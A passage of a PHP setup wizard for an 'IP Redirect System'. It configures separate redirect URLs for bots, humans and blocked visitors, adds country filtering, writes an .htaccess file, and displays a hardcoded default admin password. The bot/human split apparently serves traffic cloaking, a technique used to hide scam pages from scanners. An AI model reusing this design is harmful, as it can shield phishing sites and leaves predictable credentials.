                                if (!copy('panel_template.php', 'include/panel_template.php')) {
                                    $success = false;
                                }
                            }
                            
                            // Create .htaccess file for security
                            $htaccess = "# Disable directory listing\nOptions -Indexes\n\n# Protect data files\n<FilesMatch \"(data|include)/.*\">\nOrder deny,allow\nDeny from all\n</FilesMatch>\n";
                            
                            if (!file_put_contents('.htaccess', $htaccess)) {
                                $success = false;
                            }
                            
                            if ($success) {
                                $completed[] = 3;
                                $step = 4;
                                echo '<div class="success"><i class="fas fa-check-circle"></i> Installation finalized successfully.</div>';
                            } else {
                                echo '<div class="error"><i class="fas fa-exclamation-circle"></i> Failed to finalize installation. Please check the permissions.</div>';
                            }
                            break;
                    }
                }
            }
            
            // Display setup steps
            ?>
            
            <div class="step <?php echo isStepCompleted(1) ? 'completed-step' : ''; ?>">
                <div class="step-header">
                    <div class="step-number">1</div>
                    <h2 class="step-title">
                        Directory Setup
                        <?php if (isStepCompleted(1)): ?>
                        <span class="completed-badge"><i class="fas fa-check"></i> Completed</span>
                        <?php endif; ?>
                    </h2>
                </div>
                <?php if (!isStepCompleted(1)): ?>
                    <div class="step-content">
                        <p>This step will create the necessary directories for your visitor tracking system:</p>
                        <ul>
                            <?php foreach ($directories as $dir): ?>
                            <li><?php echo htmlspecialchars($dir); ?></li>
                            <?php endforeach; ?>
                        </ul>
                    </div>
                    <form method="post">
                        <input type="hidden" name="step" value="1">
                        <button type="submit" class="button"><i class="fas fa-folder-plus"></i> Create Directories</button>
                    </form>
                <?php else: ?>
                    <div class="success">
                        <i class="fas fa-check-circle"></i>
                        <p>All required directories have been created successfully.</p>
                    </div>
                <?php endif; ?>
            </div>
            
            <div class="step <?php echo isStepCompleted(2) ? 'completed-step' : ''; ?>">
                <div class="step-header">
                    <div class="step-number">2</div>
                    <h2 class="step-title">
                        Configure Redirects
                        <?php if (isStepCompleted(2)): ?>
                        <span class="completed-badge"><i class="fas fa-check"></i> Completed</span>
                        <?php endif; ?>
                    </h2>
                </div>
                <?php if ($step >= 2 && !isStepCompleted(2)): ?>
                    <div class="step-content">
                        <p>Configure where visitors will be redirected based on their type:</p>
                        
                        <form method="post">
                            <input type="hidden" name="step" value="2">
                            
                            <div class="form-group">
                                <label class="form-label" for="bot_redirect">Bot Redirect URL:</label>
                                <input type="url" id="bot_redirect" name="bot_redirect" class="form-input" value="<?php echo htmlspecialchars($default_bot_redirect_url); ?>" required>
                            </div>
                            
                            <div class="form-group">
                                <label class="form-label" for="human_redirect">Human Redirect URL:</label>
                                <input type="url" id="human_redirect" name="human_redirect" class="form-input" value="<?php echo htmlspecialchars($default_human_redirect_url); ?>" required>
                            </div>
                            
                            <div class="form-group">
                                <label class="form-label" for="blocked_redirect">Blocked Visitor Redirect URL:</label>
                                <input type="url" id="blocked_redirect" name="blocked_redirect" class="form-input" value="<?php echo htmlspecialchars($default_redirect_url); ?>" required>
                            </div>
                            
                            <div class="form-group">
                                <label class="form-label" for="country_mode">Country Filtering Mode:</label>
                                <select id="country_mode" name="country_mode" class="form-select">
                                    <option value="allow_all">Allow All Countries</option>
                                    <option value="allow_selected">Only Allow Selected Countries</option>
                                    <option value="block_selected">Block Selected Countries</option>
                                </select>
                            </div>
                            
                            <div class="form-group" id="countrySelectionContainer" style="display: none;">
                                <label class="form-label" for="allowed_countries">Select Countries:</label>
                                <select id="allowed_countries" name="allowed_countries[]" class="form-select" multiple style="height: 200px;">
                                    <!-- Countries will be populated by JavaScript -->
                                </select>
                                <small>Hold Ctrl (or Cmd on Mac) to select multiple countries</small>
                            </div>
                            
                            <button type="submit" class="button"><i class="fas fa-save"></i> Save Configuration</button>
                        </form>
                    </div>
                <?php elseif (isStepCompleted(2)): ?>
                    <div class="success">
                        <i class="fas fa-check-circle"></i>
                        <p>Redirect configuration has been saved successfully.</p>
                    </div>
                <?php endif; ?>
            </div>
            
            <div class="step <?php echo isStepCompleted(3) ? 'completed-step' : ''; ?>">
                <div class="step-header">
                    <div class="step-number">3</div>
                    <h2 class="step-title">
                        Finalize Setup
                        <?php if (isStepCompleted(3)): ?>
                        <span class="completed-badge"><i class="fas fa-check"></i> Completed</span>
                        <?php endif; ?>
                    </h2>
                </div>
                <?php if ($step >= 3 && !isStepCompleted(3)): ?>
                    <div class="step-content">
                        <p>Complete the setup by finalizing your installation:</p>
                        <ul>
                            <li>Set up template files</li>
                            <li>Create security settings</li>
                            <li>Prepare for first use</li>
                        </ul>
                    </div>
                    <form method="post">
                        <input type="hidden" name="step" value="3">
                        <button type="submit" class="button"><i class="fas fa-check-double"></i> Finalize Setup</button>
                    </form>
                <?php elseif (isStepCompleted(3)): ?>
                    <div class="success">
                        <i class="fas fa-check-circle"></i>
                        <p>Installation has been finalized successfully.</p>
                    </div>
                <?php endif; ?>
            </div>
            
            <?php if ($step >= 4): ?>
            <div class="step">
                <div class="step-header">
                    <div class="step-number"><i class="fas fa-flag-checkered"></i></div>
                    <h2 class="step-title">Setup Complete</h2>
                </div>
                <div class="success">
                    <i class="fas fa-check-circle"></i>
                    <p>Congratulations! Your IP Redirect System has been set up successfully.</p>
                </div>
                
                <div class="info">
                    <i class="fas fa-info-circle"></i>
                    <div>
                        <p><strong>Next Steps:</strong></p>
                        <ol>
                            <li>Access the visitor tracking dashboard at <a href="index.php?action=login&asco">index.php?action=login</a></li>
                            <li>The default password is: <strong>44feff10EE</strong></li>
                            <li>You can customize your system by editing the configuration in the data folder</li>
                        </ol>
                    </div>
                </div>
                
                <div style="text-align: center; margin-top: 1.5rem;">
                    <a href="index.php" class="button"><i class="fas fa-home"></i> Go to Main Page</a>
                </div>
            </div>
            <?php endif; ?>
        </div>
        
        <div class="footer">
            <p>IP Redirect System &copy; <?php echo date('Y'); ?> | Secure Visitor Tracking</p>
        </div>
    </div>
    
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>
    <script src="assets/js/countries.js"></script>
</body>
</html>